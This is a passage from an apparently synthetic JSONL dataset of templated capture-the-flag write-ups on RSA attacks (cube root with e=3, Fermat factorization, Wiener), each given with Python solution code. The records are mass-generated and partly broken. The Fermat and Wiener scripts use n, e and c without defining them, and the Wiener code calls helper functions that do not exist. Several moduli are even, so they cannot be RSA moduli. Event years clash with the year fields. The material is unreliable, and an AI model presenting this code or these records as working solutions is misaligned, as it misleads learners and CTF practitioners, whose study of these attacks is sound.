10805331563429417660579026221930636924431009732261473638601392607913237528442853672311588042492757126757317545751412306163362329646196855611337976310578172312059716461727305262837740495030975962197723060208477202538433565406231793883128362156718930617770378746227307554678325432614110089504987605323675\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 11706372768351567276955961247080231202479622007096001262662443037699607580401342322185082882279359325511792314918491422786628805196272277961214944689025896666541066266279245541144696567619467643106580378595662841491542707096277027746809512148188096519115694162282899544860865019817646518589141775151315\ne = 3\nc = 10805331563429417660579026221930636924431009732261473638601392607913237528442853672311588042492757126757317545751412306163362329646196855611337976310578172312059716461727305262837740495030975962197723060208477202538433565406231793883128362156718930617770378746227307554678325432614110089504987605323675\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/43", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826300", "synthetic": true}
{"id": "synthetic_rsa_044", "team": "synthetic_team_5", "event": "CTF_2024_Event_4", "challenge_name": "RSA Fermat Factorization #45", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/44", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826313", "synthetic": true}
{"id": "synthetic_rsa_045", "team": "synthetic_team_9", "event": "CTF_2024_Event_9", "challenge_name": "RSA Small Exponent Attack #46", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 50143955484670693751772835258646467350442301515682167890986374517395294360579972240433370794450103334830548680378945998567793133916249732294762984478425698797064912385569243586072019307418373678413544811445050368441249723932457190058465771685842269373656443310913614642715029868772690481838939209350450\ne = 3\nc = 32033476298573355427529928348253809582771092563302114313558857838425200390172968291243313255234323322799417089726089976808665297960612861235892876496289060726913740860440376222209672700167359780696036478597175680750606332491235194252911340892962154443395192092923232719796203366427871572190741534373496\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 50143955484670693751772835258646467350442301515682167890986374517395294360579972240433370794450103334830548680378945998567793133916249732294762984478425698797064912385569243586072019307418373678413544811445050368441249723932457190058465771685842269373656443310913614642715029868772690481838939209350450\ne = 3\nc = 32033476298573355427529928348253809582771092563302114313558857838425200390172968291243313255234323322799417089726089976808665297960612861235892876496289060726913740860440376222209672700167359780696036478597175680750606332491235194252911340892962154443395192092923232719796203366427871572190741534373496\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/45", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826335", "synthetic": true}
{"id": "synthetic_rsa_046", "team": "synthetic_team_3", "event": "CTF_2024_Event_10", "challenge_name": "RSA Fermat Factorization #47", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/46", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826348", "synthetic": true}
{"id": "synthetic_rsa_047", "team": "synthetic_team_8", "event": "CTF_2024_Event_16", "challenge_name": "RSA Fermat Factorization #48", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/47", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826362", "synthetic": true}
{"id": "synthetic_rsa_048", "team": "synthetic_team_8", "event": "CTF_2024_Event_15", "challenge_name": "RSA Wiener Attack #49", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/48", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826376", "synthetic": true}
{"id": "synthetic_rsa_049", "team": "synthetic_team_9", "event": "CTF_2024_Event_2", "challenge_name": "RSA Small Exponent Attack #50", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 33051671039752102271627151724367499346975761374310996164496688993049836231870355157760487341886886970828573070807796829343490902164861593284884663532983026082838797304101495960996870112139812908094418627375730856911321567666489362472537995300767034106712251604388448582929327261312536494833677674688500\ne = 3\nc = 6071388919417920684673099606685528639137556360080489415356724985319420148064230249489796169299321917684211868249096790547686404629432986301317034432636804321931756577703455154655055764808507402175697584478919161659982129580448669102785734363878842277139268279266902106588793361795497768895296048832906\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 33051671039752102271627151724367499346975761374310996164496688993049836231870355157760487341886886970828573070807796829343490902164861593284884663532983026082838797304101495960996870112139812908094418627375730856911321567666489362472537995300767034106712251604388448582929327261312536494833677674688500\ne = 3\nc = 6071388919417920684673099606685528639137556360080489415356724985319420148064230249489796169299321917684211868249096790547686404629432986301317034432636804321931756577703455154655055764808507402175697584478919161659982129580448669102785734363878842277139268279266902106588793361795497768895296048832906\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/49", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826398", "synthetic": true}
{"id": "synthetic_rsa_050", "team": "synthetic_team_4", "event": "CTF_2024_Event_6", "challenge_name": "RSA Fermat Factorization #51", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/50", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826412", "synthetic": true}
{"id": "synthetic_rsa_051", "team": "synthetic_team_10", "event": "CTF_2024_Event_20", "challenge_name": "RSA Small Exponent Attack #52", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 29876450509285807892652106723910160306825063956284308365789004403376616119849423031726569851961746683374161135534429753721650145817379108230867190982591662959380139185482922723644852990877936637798827444664354041167070553848739113598950849848491875581771664328325183449753284770344093413333398705889288\ne = 3\nc = 23658228527173656031004524914087434395397220452718345249615701078031338149057387545143014838105092915519531700769429686380391484246493979695416181686383058752824797699116940185822364434434558944857339445865578730439974774256173696818861918120103136748828727567730979855968999848655494688507921999362411\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 29876450509285807892652106723910160306825063956284308365789004403376616119849423031726569851961746683374161135534429753721650145817379108230867190982591662959380139185482922723644852990877936637798827444664354041167070553848739113598950849848491875581771664328325183449753284770344093413333398705889288\ne = 3\nc = 23658228527173656031004524914087434395397220452718345249615701078031338149057387545143014838105092915519531700769429686380391484246493979695416181686383058752824797699116940185822364434434558944857339445865578730439974774256173696818861918120103136748828727567730979855968999848655494688507921999362411\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/51", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826436", "synthetic": true}
{"id": "synthetic_rsa_052", "team": "synthetic_team_5", "event": "CTF_2024_Event_2", "challenge_name": "RSA Fermat Factorization #53", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/52", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826451", "synthetic": true}
{"id": "synthetic_rsa_053", "team": "synthetic_team_9", "event": "CTF_2024_Event_1", "challenge_name": "RSA Fermat Factorization #54", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/53", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826485", "synthetic": true}
{"id": "synthetic_rsa_054", "team": "synthetic_team_6", "event": "CTF_2024_Event_6", "challenge_name": "RSA Wiener Attack #55", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/54", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826499", "synthetic": true}
{"id": "synthetic_rsa_055", "team": "synthetic_team_5", "event": "CTF_2024_Event_15", "challenge_name": "RSA Small Exponent Attack #56", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 68538079320445909788824238222704370871450699642421370060464495283650230650052625620625011619387196920548341133715328278374419885083558673432703431839897337822262834219719259345558075348949202540216280738013670970760798072969162187563072797784898163987330022664405271764353987747810263450428508781313360\ne = 3\nc = 24823901643547240058335028492845148837557022304313662600619914987880248193793784136183841358600493820591471932225773755288782068146835832985465590617740491096085726644175394501151810629016829644914783624602610784087063759468265553598249311242351142746786187462712957647526395689159632230935789310095274\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 68538079320445909788824238222704370871450699642421370060464495283650230650052625620625011619387196920548341133715328278374419885083558673432703431839897337822262834219719259345558075348949202540216280738013670970760798072969162187563072797784898163987330022664405271764353987747810263450428508781313360\ne = 3\nc = 24823901643547240058335028492845148837557022304313662600619914987880248193793784136183841358600493820591471932225773755288782068146835832985465590617740491096085726644175394501151810629016829644914783624602610784087063759468265553598249311242351142746786187462712957647526395689159632230935789310095274\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/55", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826521", "synthetic": true}
{"id": "synthetic_rsa_056", "team": "synthetic_team_10", "event": "CTF_2024_Event_12", "challenge_name": "RSA Small Exponent Attack #57", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 16246760969387815919464780014076101440364681234223418976960171981621423456833931790687910823028898152940531045367507808694338344656524970936528257150204082858075696466686032851940912979514201602026395604893614410596495963680684191918272108290959515342709041761571136486845957163282712918338458997912135\ne = 3\nc = 3623014482041209285255798286053464334988406178765278366144309618111944327353203718338530394200544924543205788868208516945378132715407744551719094883545229114832203028415698303637374318003255413954734718486110267786131803355191277933283575856115282898774626007045403358997975419179818768181914266566095\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 16246760969387815919464780014076101440364681234223418976960171981621423456833931790687910823028898152940531045367507808694338344656524970936528257150204082858075696466686032851940912979514201602026395604893614410596495963680684191918272108290959515342709041761571136486845957163282712918338458997912135\ne = 3\nc = 3623014482041209285255798286053464334988406178765278366144309618111944327353203718338530394200544924543205788868208516945378132715407744551719094883545229114832203028415698303637374318003255413954734718486110267786131803355191277933283575856115282898774626007045403358997975419179818768181914266566095\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/56", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826544", "synthetic": true}
{"id": "synthetic_rsa_057", "team": "synthetic_team_6", "event": "CTF_2024_Event_6", "challenge_name": "RSA Fermat Factorization #58", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/57", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826559", "synthetic": true}
